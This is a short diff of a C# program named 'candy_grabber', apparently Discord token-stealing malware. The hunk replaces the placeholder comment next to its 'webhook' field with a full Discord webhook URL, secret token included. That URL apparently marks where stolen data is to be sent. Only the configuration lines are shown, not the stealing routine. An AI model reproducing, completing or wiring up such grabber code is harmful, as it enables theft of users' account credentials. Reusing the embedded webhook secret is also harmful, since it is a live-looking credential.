@@ -12,7 +12,7 @@ namespace candy_grabber
 {
     class Program
     {
-        private static string webhook = ""; // Your webhook goes here
+        private static string webhook = ""; // https://discord.com/api/webhooks/798651106007318558/PazdO0_tVfngj6rbbK5JzT0lexyhzNZPO9HiTZlR4-ZDcH7O87KtFZrfUaIaY_9HAQrR
         private static bool foundSth = false;
 
         static void Main()
